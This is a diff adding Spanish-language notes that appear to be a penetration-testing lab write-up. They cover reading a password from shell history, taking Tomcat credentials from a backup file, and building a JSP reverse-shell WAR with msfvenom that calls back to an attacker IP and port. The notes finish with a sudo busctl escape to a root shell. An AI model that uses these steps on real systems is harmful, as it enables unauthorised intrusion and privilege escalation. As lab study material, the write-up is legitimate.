@@ -530,11 +530,41 @@ Esto sube el archivo suid al host. regresamos al host y ejecutamos esa shell y o
 	
 
 	
+## Assesment 
+
+Primero nos conectamos a la maquina leemos las banderas despues nos damos cuenta que en el .history esta una contraseña del usuario barry.
+Despues nos conectamos con el usuario barry nos damos cuenta que pertenece al grupo adm el cual puede leer archivos en /var
+
+```
+find / -name "*user*" -type f -name barry -group adm 2>/dev/null
+# Juega con estos comandos
+```
 	
-	
-	
-	
-	
+Para esta flag nos damos cuenta de los servicios expuestos que son mysql un apache 80 y un tomcat 8080. Con el comando de arriba encontramos los usuarios
+de tomcat el en un archivo que se llama "tomcat-users.xml.bak" nos conectamos al portal de administracion del tomcar y buscamos como hacer un RCE.
+Nos damos cuenta que se puede ejecutar una shell pero con extencion ".war" para lo cual usamos msvenom:
+
+
+```
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.25 LPORT=4444 -f war > runme.war
+
+```
+
+Obtenemos acceso a la maquina con el usuario tomcat (o uno similar) y vemos que comanod podemos utilizar
+
+```
+sudo -l
+busctl
+
+```
+Se puede ejcutar busctl con privilegios de administrador entonces de una buscamos en GTOBins y nos damos cuenta que es muy facil escalar privilegios:
+
+```
+sudo busctl --show-machine
+!/bin/sh
+```
+
+Listo root
 	
 	
 	
